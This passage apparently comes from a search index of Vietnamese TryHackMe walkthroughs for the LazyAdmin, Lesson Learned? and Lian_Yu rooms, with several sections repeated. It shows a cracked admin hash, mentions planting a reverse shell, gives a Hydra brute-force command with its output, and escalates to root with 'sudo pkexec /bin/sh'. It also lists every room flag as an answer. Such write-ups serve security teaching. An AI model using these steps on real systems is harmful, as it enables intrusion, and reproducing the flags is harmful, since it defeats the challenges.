SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\\\\" Site close \\\\ \" to open your website.</p><p>More help at <a href=\\\\\" http : // www . basic - cms . org / docs / 5 - things - need - to - be - done - when - SweetRice - installed / \\\\ \">Tip for Basic CMS SweetRice installed</a></p>\\\\\" ; s : 5 : \\\\ \"cache\\\\\" ; i : 0 ; s : 13 : \\\\ \"cache_expired\\\\\" ; i : 0 ; s : 10 : \\\\ \"user_track\\\\\" ; i : 0 ; s : 11 : \\\\ \"url_rewrite\\\\\" ; i : 0 ; s : 4 : \\\\ \"logo\\\\\" ; s : 0 : \\\\ \"\\\\\" ; s : 5 : \\\\ \"theme\\\\\" ; s : 0 : \\\\ \"\\\\\" ; s : 4 : \\\\ \"lang\\\\\" ; s : 9 : \\\\ \"en-us.php\\\\\" ; s : 11 : \\\\ \"admin_email\\\\\" ; N ; }\\ ',\\' 1575023409 \\ ');' , 15 => 'INSERT INTO `%--%_options` VALUES(\\' 2 \\ ',\\' categories \\ ',\\' \\ ',\\' 1575023409 \\ ');' , \u0110\u1ec3 \u00fd th\u1ea5y \u0111o\u1ea1n m\u00e3 tr\u00ean ch\u1ee9a th\u00f4ng tin account admin l\u00e0 manager v\u00e0 password \u0111\u01b0\u1ee3c hash th\u00e0nh 42f749ade7f9e195bf475f37a44cafcb . D\u00f9ng hashid \u0111\u1ec3 t\u00ecm ph\u1ecfng \u0111o\u00e1n password. V\u00e0 n\u00f3 l\u00e0 MD5, ta \u0111\u01b0\u1ee3c password l\u00e0 Password123 :)) login thoai..... Trong trang giao di\u1ec7n admin, ta c\u00f3 th\u1ec3 t\u00ecm \u0111\u01b0\u1ee3c nhi\u1ec1u ch\u1ed7 \u0111\u1ec3 ti\u00eam reverseshell nh\u01b0 theme, ads,... Alt text Sau khi c\u00f3 revershell, d\u1ec5 d\u00e0ng ta l\u1ea5y \u0111\u01b0\u1ee3c flag user.txt Ph\u1ea7n leo thang \u0111\u1eb7c quy\u1ec1n, ch\u00fa \u00fd k\u0129 file t\u1ea1i /home/itguy/backup.pl .`","title":"LazyAdmin"},{"location":"tryhackme/room/lazyadmin/#lazyadmin","text":"Room at https://tryhackme.com/room/lazyadmin","title":"LazyAdmin"},{"location":"tryhackme/room/lazyadmin/#task-1-lazy-admin","text":"","title":"Task 1: Lazy Admin"},{"location":"tryhackme/room/lazyadmin/#answer-the-questions-bellow","text":"What is the user flag? Ans: THM{63e5bce9271952aad1113b6f1ac28a07} What is the root flag? Ans: THM{6637f41d0177b6f37cb20d775124699f}","title":"Answer the questions bellow"},{"location":"tryhackme/room/lazyadmin/#huong-dan","text":"\u0110\u1ea7u ti\u00ean khi v\u00e0o IP, c\u00e1c b\u1ea1n s\u1ebd kh\u00f4ng th\u1ea5y g\u00ec \u0111\u00e2u ::). Ta ph\u1ea3i th\u1ef1c hi\u1ec7n recon trang web th\u00ec th\u1ea5y \u0111\u01b0\u1ee3c website chu\u1ea9n ch\u1ec9 l\u00e0 http://IP/content . Ti\u1ebfp t\u1ee5c, gobuster ti\u1ebfp ta \u0111\u01b0\u1ee3c trang inc (ch\u1ee9a th\u00f4ng tin c\u00e1c file code php, txt, db, ...) v\u00e0 trang http://IP/content/as \u0111\u1ec3 login account. G\u1ed3i g\u1ed3i, sau m\u1ed9t h\u1ed3i xem x\u00e9t website th\u00ec th\u1ea5y file mysql_bakup_20191129023059-1.5.1.sql ch\u1ee9a \u0111o\u1ea1n d\u01b0\u1edbi \u0111\u00e2y 14 => 'INSERT INTO `%--%_options` VALUES(\\' 1 \\ ',\\' global_setting \\ ',\\' a : 17 : { s : 4 : \\\\ \"name\\\\\" ; s : 25 : \\\\ \"Lazy Admin&#039;s Website\\\\\" ; s : 6 : \\\\ \"author\\\\\" ; s : 10 : \\\\ \"Lazy Admin\\\\\" ; s : 5 : \\\\ \"title\\\\\" ; s : 0 : \\\\ \"\\\\\" ; s : 8 : \\\\ \"keywords\\\\\" ; s : 8 : \\\\ \"Keywords\\\\\" ; s : 11 : \\\\ \"description\\\\\" ; s : 11 : \\\\ \"Description\\\\\" ; s : 5 : \\\\ \"admin\\\\\" ; s : 7 : \\\\ \"manager\\\\\" ; s : 6 : \\\\ \"passwd\\\\\" ; s : 32 : \\\\ \"42f749ade7f9e195bf475f37a44cafcb\\\\\" ; s : 5 : \\\\ \"close\\\\\" ; i : 1 ; s : 9 : \\\\ \"close_tip\\\\\" ; s : 454 : \\\\ \"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\\\\" Site close \\\\ \" to open your website.</p><p>More help at <a href=\\\\\" http : // www . basic - cms . org / docs / 5 - things - need - to - be - done - when - SweetRice - installed / \\\\ \">Tip for Basic CMS SweetRice installed</a></p>\\\\\" ; s : 5 : \\\\ \"cache\\\\\" ; i : 0 ; s : 13 : \\\\ \"cache_expired\\\\\" ; i : 0 ; s : 10 : \\\\ \"user_track\\\\\" ; i : 0 ; s : 11 : \\\\ \"url_rewrite\\\\\" ; i : 0 ; s : 4 : \\\\ \"logo\\\\\" ; s : 0 : \\\\ \"\\\\\" ; s : 5 : \\\\ \"theme\\\\\" ; s : 0 : \\\\ \"\\\\\" ; s : 4 : \\\\ \"lang\\\\\" ; s : 9 : \\\\ \"en-us.php\\\\\" ; s : 11 : \\\\ \"admin_email\\\\\" ; N ; }\\ ',\\' 1575023409 \\ ');' , 15 => 'INSERT INTO `%--%_options` VALUES(\\' 2 \\ ',\\' categories \\ ',\\' \\ ',\\' 1575023409 \\ ');' , \u0110\u1ec3 \u00fd th\u1ea5y \u0111o\u1ea1n m\u00e3 tr\u00ean ch\u1ee9a th\u00f4ng tin account admin l\u00e0 manager v\u00e0 password \u0111\u01b0\u1ee3c hash th\u00e0nh 42f749ade7f9e195bf475f37a44cafcb . D\u00f9ng hashid \u0111\u1ec3 t\u00ecm ph\u1ecfng \u0111o\u00e1n password. V\u00e0 n\u00f3 l\u00e0 MD5, ta \u0111\u01b0\u1ee3c password l\u00e0 Password123 :)) login thoai..... Trong trang giao di\u1ec7n admin, ta c\u00f3 th\u1ec3 t\u00ecm \u0111\u01b0\u1ee3c nhi\u1ec1u ch\u1ed7 \u0111\u1ec3 ti\u00eam reverseshell nh\u01b0 theme, ads,... Alt text Sau khi c\u00f3 revershell, d\u1ec5 d\u00e0ng ta l\u1ea5y \u0111\u01b0\u1ee3c flag user.txt Ph\u1ea7n leo thang \u0111\u1eb7c quy\u1ec1n, ch\u00fa \u00fd k\u0129 file t\u1ea1i /home/itguy/backup.pl .`","title":"H\u01b0\u1edbng d\u1eabn"},{"location":"tryhackme/room/lessonlearned/","tags":["THM-Room","Privilege Escalation"],"text":"Lesson Learned? \u00b6 Room at https://tryhackme.com/room/lessonlearned List of the questions solved Question: name Ans: THM{aab02c6b76bb752456a54c80c2d6fb1e} Pentest scenario \u00b6 Host: 10.10.235.161 B\u00e0i n\u00e0y \u0111\u1ec1 b\u00e0i \u0111\u00e3 n\u00eau r\u00f5 r\u00e0ng v\u1eady r\u1ed3i, ta s\u1ebd focus v\u00e0o trang login. Reconnaissance \u00b6 Sau m\u1ed9t v\u00e0i thao t\u00e1c v\u1edbi trang web, ta c\u00f3 1 v\u00e0i nh\u1eadn x\u00e9t: N\u1ebfu sai username v\u00e0 password th\u00ec s\u1ebd xu\u1ea5t ra th\u00f4ng b\u00e1o \"Invalid username and password.\" C\u00f3 th\u1ec3 c\u00f3 l\u1ed7 h\u1ecfng SQLi Hint D\u1ef1a v\u00e0o nh\u1eadn x\u00e9t m\u1ed9t, ta c\u00f3 1 th\u1ee7 thu\u1eadt Brute Force username nho nh\u1ecf b\u1eb1ng Hydra nh\u01b0 b\u00ean d\u01b0\u1edbi Hydra Brute force \u2514\u2500 $ hydra -L $PASS_WORD -p a 10 . 10 . 235 . 161 http-post-form \"/index.php:username=^USER^&password=^PASS^:F=Invalid username and password.\" Hydra v9 . 5 ( c ) 2023 by van Hauser / THC & David Maciejak - Please do not use in military or secret service organizations , or for illegal purposes ( this is non-binding , these *** ignore laws and ethics anyway ). Hydra ( https :// github . com / vanhauser-thc / thc-hydra ) starting at 2023 - 09 - 02 14 : 21 : 45 [DATA] max 16 tasks per 1 server , overall 16 tasks , 8295455 login tries ( l : 8295455 / p : 1 ), ~ 518466 tries per task [DATA] attacking http-post-form :// 10 . 10 . 235 . 161 : 80 / index . php : username =^ USER ^& password =^ PASS ^: F = Invalid username and password . [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : martin password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : patrick password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : stuart password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : marcus password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : kelly password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : arnold password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Martin password : a [STATUS] 642 . 00 tries / min , 642 tries in 00 : 01h , 8294813 to do in 215 : 21h , 16 active [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : karen password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Patrick password : a [STATUS] 680 . 67 tries / min , 2042 tries in 00 : 03h , 8293413 to do in 203 : 05h , 16 active [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Marcus password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : sophia password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Stuart password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : PATRICK password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Kelly password : a [STATUS] 647 . 71 tries / min , 4534 tries in 00 : 07h , 8290921 to do in 213 : 21h , 16 active [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Karen password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : veronica password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Arnold password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : naomi password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : MARTIN password : a [STATUS] 652 . 20 tries / min , 9783 tries in 00 : 15h , 8285672 to do in 211 : 45h , 16 active Nh\u01b0 h\u00ecnh tr\u00ean, ta \u0111\u00e3 t\u00ecm \u0111\u01b0\u1ee3c r\u1ea5t nhi\u1ec1u username (c\u00f2n nhi\u1ec1u h\u01a1n th\u1ebf n\u1eefa,...) v\u00e0 th\u00f4ng b\u00e1o l\u1ed7i s\u1ebd l\u00e0 \"Invalid password.\". T\u00f4i c\u00f3 brute force password 1 user (b\u1ea5t k\u00ec) th\u00ec th\u1ea5y vi\u1ec7c t\u00ecm lu\u00f4n c\u1ea3 password l\u00e0 \u0111i\u1ec1u kh\u00f4ng kh\u1ea3 thi, c\u00f3 th\u1ec3 challenge n\u00e0y chuy\u00ean v\u1ec1 SQLi khi c\u00f3 username. Wow, v\u00e0 t\u00f4i \u0111\u00e3 th\u1eed v\u00e0 c\u00f3 flag nh\u01b0 h\u00ecnh b\u00ean d\u01b0\u1edbi. What we learned \u00b6 Hydra SQLi","title":"Lesson Learned?"},{"location":"tryhackme/room/lessonlearned/#lesson-learned","text":"Room at https://tryhackme.com/room/lessonlearned List of the questions solved Question: name Ans: THM{aab02c6b76bb752456a54c80c2d6fb1e}","title":"Lesson Learned?"},{"location":"tryhackme/room/lessonlearned/#pentest-scenario","text":"Host: 10.10.235.161 B\u00e0i n\u00e0y \u0111\u1ec1 b\u00e0i \u0111\u00e3 n\u00eau r\u00f5 r\u00e0ng v\u1eady r\u1ed3i, ta s\u1ebd focus v\u00e0o trang login.","title":"Pentest scenario"},{"location":"tryhackme/room/lessonlearned/#reconnaissance","text":"Sau m\u1ed9t v\u00e0i thao t\u00e1c v\u1edbi trang web, ta c\u00f3 1 v\u00e0i nh\u1eadn x\u00e9t: N\u1ebfu sai username v\u00e0 password th\u00ec s\u1ebd xu\u1ea5t ra th\u00f4ng b\u00e1o \"Invalid username and password.\" C\u00f3 th\u1ec3 c\u00f3 l\u1ed7 h\u1ecfng SQLi Hint D\u1ef1a v\u00e0o nh\u1eadn x\u00e9t m\u1ed9t, ta c\u00f3 1 th\u1ee7 thu\u1eadt Brute Force username nho nh\u1ecf b\u1eb1ng Hydra nh\u01b0 b\u00ean d\u01b0\u1edbi Hydra Brute force \u2514\u2500 $ hydra -L $PASS_WORD -p a 10 . 10 . 235 . 161 http-post-form \"/index.php:username=^USER^&password=^PASS^:F=Invalid username and password.\" Hydra v9 . 5 ( c ) 2023 by van Hauser / THC & David Maciejak - Please do not use in military or secret service organizations , or for illegal purposes ( this is non-binding , these *** ignore laws and ethics anyway ). Hydra ( https :// github . com / vanhauser-thc / thc-hydra ) starting at 2023 - 09 - 02 14 : 21 : 45 [DATA] max 16 tasks per 1 server , overall 16 tasks , 8295455 login tries ( l : 8295455 / p : 1 ), ~ 518466 tries per task [DATA] attacking http-post-form :// 10 . 10 . 235 . 161 : 80 / index . php : username =^ USER ^& password =^ PASS ^: F = Invalid username and password . [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : martin password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : patrick password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : stuart password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : marcus password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : kelly password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : arnold password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Martin password : a [STATUS] 642 . 00 tries / min , 642 tries in 00 : 01h , 8294813 to do in 215 : 21h , 16 active [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : karen password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Patrick password : a [STATUS] 680 . 67 tries / min , 2042 tries in 00 : 03h , 8293413 to do in 203 : 05h , 16 active [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Marcus password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : sophia password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Stuart password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : PATRICK password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Kelly password : a [STATUS] 647 . 71 tries / min , 4534 tries in 00 : 07h , 8290921 to do in 213 : 21h , 16 active [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Karen password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : veronica password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : Arnold password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : naomi password : a [ 80 ][ http-post-form ] host : 10 . 10 . 235 . 161 login : MARTIN password : a [STATUS] 652 . 20 tries / min , 9783 tries in 00 : 15h , 8285672 to do in 211 : 45h , 16 active Nh\u01b0 h\u00ecnh tr\u00ean, ta \u0111\u00e3 t\u00ecm \u0111\u01b0\u1ee3c r\u1ea5t nhi\u1ec1u username (c\u00f2n nhi\u1ec1u h\u01a1n th\u1ebf n\u1eefa,...) v\u00e0 th\u00f4ng b\u00e1o l\u1ed7i s\u1ebd l\u00e0 \"Invalid password.\". T\u00f4i c\u00f3 brute force password 1 user (b\u1ea5t k\u00ec) th\u00ec th\u1ea5y vi\u1ec7c t\u00ecm lu\u00f4n c\u1ea3 password l\u00e0 \u0111i\u1ec1u kh\u00f4ng kh\u1ea3 thi, c\u00f3 th\u1ec3 challenge n\u00e0y chuy\u00ean v\u1ec1 SQLi khi c\u00f3 username. Wow, v\u00e0 t\u00f4i \u0111\u00e3 th\u1eed v\u00e0 c\u00f3 flag nh\u01b0 h\u00ecnh b\u00ean d\u01b0\u1edbi.","title":"Reconnaissance"},{"location":"tryhackme/room/lessonlearned/#what-we-learned","text":"Hydra SQLi","title":"What we learned"},{"location":"tryhackme/room/lianyu/","tags":["THM-Room","Privilege Escalation"],"text":"Lian_Yu \u00b6 See room in https://tryhackme.com/room/lianyu Task 1: Find the Flags \u00b6 Answer the questions below Deploy the VM and Start the Enumeration Answer No needed answer What is the Web Directory you found? Answer 2100 What is the file name you found? Answer green_arrow . ticket What is the FTP Password? Answer ! #th3h00d What is the file name with SSH password? Answer shado user.txt Answer THM { P30P7E_K33P_53CRET5__C0MPUT3R5_D0N ' T } root.txt Answer THM { MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I ' LL_BE_D34D } Explanation and attack scenario \u00b6 First, we will test some basic things in this website first such as port test (scan port through nmap), url test (gobuster, wfuzz,...) With nmap, you should consider it because it's extremely noisy. I will use Vietnamese to present. \u0110\u1ecba ch\u1ec9 ip c\u1ee7a website: 10.10.254.149 \u0110\u1ea7u ti\u00ean ta ti\u1ebfn h\u00e0nh scan website xem c\u00e1c service tr\u01b0\u1edbc: -sV -sT -sC -vv 10.10.254.149 Ta \u0111\u01b0\u1ee3c k\u1ebft qu\u1ea3 scan port nh\u01b0 h\u00ecnh b\u00ean d\u01b0\u1edbi: Alt text Ch\u00fa \u00fd \u0111\u1ebfn Terminal PORT STATE SERVICE REASON VERSION 21 / tcp open ftp syn-ack vsftpd 3 . 0 . 2 22 / tcp open ssh syn-ack OpenSSH 6 . 7p1 Debian 5 + deb8u8 ( protocol 2 . 0 ) | ssh-hostkey : | 1024 5650bd11efd4ac5632c3ee733ede87f4 ( DSA ) | ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T + pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV + d35X8CTUM882eJX + t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs / y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54 / tI5s6i4Tfpah2k + fnkLzX74fONcAEqseZDOffn5bxS + nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv + hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A + HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg == | 2048 396f3a9cb62dad0cd86dbe77130725d6 ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww + oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5 / bDtgOnzfd + 70Rul + G7Ch0uzextmZh7756 / VrqKn + rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm / YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z + EfuCAfvMe0hxtrbHlb + VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini + VzDhXal1H7l / HkQJKw9NSUJXOtLjWKlU4l +/ xEkXPxZ | 256 a66996d76d6127967ebb9f83601b5212 ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2 + e / xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf + QRtxvjnqRg = | 256 3f437675a85aa6cd33b066420491fea0 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E / Fn 80 / tcp open http syn-ack Apache httpd Ta th\u1ea5y \u0111\u01b0\u1ee3c 3 port, 1 cho ssh, 1 ftp v\u00e0 1 http. \u0110\u00e2y c\u00f3 v\u1ebb l\u00e0 th\u00f4ng tin ta c\u1ea7n. Ti\u1ebfp theo, ta b\u1eaft \u0111\u1ea7u t\u00ecm ki\u1ebfm url b\u1eb1ng gobuster. Ta nh\u1eadn \u0111\u01b0\u1ee3c \u0111\u01b0\u1eddng d\u1eabn \u0111\u1ebfn file 2100 Alt text Ta t\u00ecm \u0111\u01b0\u1ee3c url http://10.10.254.149/island c\u00f3 n\u1ed9i dung tr\u00f4ng nh\u01b0 th\u1ebf n\u00e0y \u0111\u00e2y: Alt text \u0110\u1ec3 \u00fd ch\u00fat x\u00edu th\u00ec trang n\u00e0y ch\u1ee9a th\u00f4ng tin b\u1ed5 \u00edch cho ch\u00fang ta \u0111\u00ea\u00ed. H\u1ecd b\u1ea3o h\u00e3y d\u00f9ng word g\u00ec \u0111\u00f3 \u0111\u1ec3 \u0111\u1ebfn \u0111\u01b0\u1ee3c LianYu th\u00ec ch\u1eafc l\u00e0 username cho ftp hay ssh g\u00ec \u0111\u00f3 ro\u00e0i. Ta xem source code th\u00ec nh\u1eadn \u0111\u01b0\u1ee3c m\u00e3 vigilante \u0111\u01b0\u1ee3c \u0111\u00e1nh color white t\u1eeb \u0111\u1ea7u. B\u1ea3o sao ::). Ti\u1ebfp t\u1ee5c gobuster \u0111\u1ec3 qu\u00e9t url... Alt text Xem source code c\u1ee7a website m\u1edbi ta th\u1ea5y c\u00f3 1 d\u00f2ng command v\u1ec1 file c\u00f3 extension l\u00e0 .ticket. Ti\u1ebfp t\u1ee5c d\u00f9ng gobuster v\u00e0 ta t\u00ecm \u0111\u01b0\u1ee3c file green_arrow.ticket . Alt text N\u1ed9i dung file m\u00f4 t\u1ea3 l\u00e0 token c\u1ee7a Queen's Gambit(Ship) Alt text \u0110\u00e2y l\u00e0 1 password \u0111\u01b0\u1ee3c m\u00e3 h\u00f3a theo base58. Sau khi gi\u1ea3i m\u00e3, ta \u0111\u01b0\u1ee3c flag: !#th3h00d. B\u00e2y gi\u1edd \u0111\u00e3 \u0111\u1ee7: username = vigilante password = !#th3h00d Ta th\u1eed th\u00ec \u0111\u00e2y ch\u00ednh l\u00e0 th\u00f4ng tin \u0111\u1ec3 login ftp. Ro\u00e0i, login th\u00f4i Alt text V\u00e0 xem, ta c\u00f3 g\u00ec n\u00e0o, 3 file \u1ea3nh. Ta s\u1ebd get n\u00f3 v\u1ec1 m\u00e1y v\u00e0 xem th\u00ec ph\u00e1t hi\u1ec7n file \u1ea3nh Leave_me_alone.png m\u1eb7c d\u00f9 \u0111\u00fang extension nh\u01b0ng m\u00e3 hex b\u1ecb sai l\u00e0m cho vi\u1ec7c xem \u1ea3nh tr\u1edf n\u00ean kh\u00f4ng th\u1ec3. Ta s\u1ebd ch\u1ec9nh l\u1ea1i hex b\u1eb1ng th\u00f4ng tin tr\u00ean wiki Alt text V\u00e0 ta \u0111\u00e3 th\u1ea5y th\u00f4ng tin tr\u00ean \u1ea3nh Alt text Ch\u1ea3 c\u00f3 g\u00ec \u1edf tr\u1ecfng :). Osint ti\u1ebfp c\u00e1c file \u1ea3nh kh\u00e1c th\u00f4i Nh\u1eadn th\u1ea5y file aa.jpg nh\u01b0 file r\u00e1c g\u00ec \u0111\u00f3, ch\u1eafc h\u1eb5n l\u00e0 fiel ch\u1ee9a d\u1eef li\u1ec7u \u1ea9n gi\u1ea5u, ta d\u00f9ng c\u00e1c c\u00f4ng c\u1ee5 \u0111\u1ec3 xem file \u1ea9n. \u1ede \u0111\u00e2y t\u00f4i d\u00f9ng stegseek -sf aa.jpg v\u00e0 t\u00ecm \u0111\u01b0\u1ee3c file shado ch\u1ee9a password, \u0111\u00e2y l\u00e0 flag c\u1ea7n t\u00ecm. Login ssh v\u1edbi user slade, ta s\u1ebd xem \u0111\u01b0\u1ee3c file user.txt. Ti\u1ebfp theo, ki\u1ec3m tra quy\u1ec1n c\u1ee7a slade b\u1eb1ng sudo -l v\u00e0 \u0111\u00e2y b\u1ecb l\u1ed7i leo thang \u0111\u1eb7c quy\u1ec1n pkexec \u0111\u01b0\u1ee3c ph\u00e9p s\u1eed d\u1ee5ng sudo. Ta s\u1ebd ti\u1ebfn h\u00e0nh leo thang \u0111\u1eb7c quy\u1ec1n b\u1eb1ng sudo pkexec /bin/sh v\u00e0 l\u1ea5y \u0111\u01b0\u1ee3c quy\u1ec1n root.","title":"Lian_Yu"},{"location":"tryhackme/room/lianyu/#lian_yu","text":"See room in https://tryhackme.com/room/lianyu","title":"Lian_Yu"},{"location":"tryhackme/room/lianyu/#task-1-find-the-flags","text":"Answer the questions below Deploy the VM and Start the Enumeration Answer No needed answer What is the Web Directory you found? Answer 2100 What is the file name you found? Answer green_arrow . ticket What is the FTP Password? Answer ! #th3h00d What is the file name with SSH password? Answer shado user.txt Answer THM { P30P7E_K33P_53CRET5__C0MPUT3R5_D0N ' T } root.txt Answer THM { MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I ' LL_BE_D34D }","title":"Task 1: Find the Flags"},{"location":"tryhackme/room/lianyu/#explanation-and-attack-scenario","text":"First, we will test some basic things in this website first such as port test (scan port through nmap), url test (gobuster, wfuzz,...) With nmap, you should consider it because it's extremely noisy. I will use Vietnamese to present. \u0110\u1ecba ch\u1ec9 ip c\u1ee7a website: 10.10.254.149 \u0110\u1ea7u ti\u00ean ta ti\u1ebfn h\u00e0nh scan website xem c\u00e1c service tr\u01b0\u1edbc: -sV -sT -sC -vv 10.10.254.149 Ta \u0111\u01b0\u1ee3c k\u1ebft qu\u1ea3 scan port nh\u01b0 h\u00ecnh b\u00ean d\u01b0\u1edbi: Alt text Ch\u00fa \u00fd \u0111\u1ebfn Terminal PORT STATE SERVICE REASON VERSION 21 / tcp open ftp syn-ack vsftpd 3 . 0 . 2 22 / tcp open ssh syn-ack OpenSSH 6 . 7p1 Debian 5 + deb8u8 ( protocol 2 . 0 ) | ssh-hostkey : | 1024 5650bd11efd4ac5632c3ee733ede87f4 ( DSA ) | ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T + pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV + d35X8CTUM882eJX + t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs / y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54 / tI5s6i4Tfpah2k + fnkLzX74fONcAEqseZDOffn5bxS + nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv + hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A + HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg == | 2048 396f3a9cb62dad0cd86dbe77130725d6 ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww + oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5 / bDtgOnzfd + 70Rul + G7Ch0uzextmZh7756 / VrqKn + rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm / YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z + EfuCAfvMe0hxtrbHlb + VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini + VzDhXal1H7l / HkQJKw9NSUJXOtLjWKlU4l +/ xEkXPxZ | 256 a66996d76d6127967ebb9f83601b5212 ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2 + e / xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf + QRtxvjnqRg = | 256 3f437675a85aa6cd33b066420491fea0 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E / Fn 80 / tcp open http syn-ack Apache httpd Ta th\u1ea5y \u0111\u01b0\u1ee3c 3 port, 1 cho ssh, 1 ftp v\u00e0 1 http. \u0110\u00e2y c\u00f3 v\u1ebb l\u00e0 th\u00f4ng tin ta c\u1ea7n. Ti\u1ebfp theo, ta b\u1eaft \u0111\u1ea7u t\u00ecm ki\u1ebfm url b\u1eb1ng gobuster. Ta nh\u1eadn \u0111\u01b0\u1ee3c \u0111\u01b0\u1eddng d\u1eabn \u0111\u1ebfn file 2100 Alt text Ta t\u00ecm \u0111\u01b0\u1ee3c url http://10.10.254.149/island c\u00f3 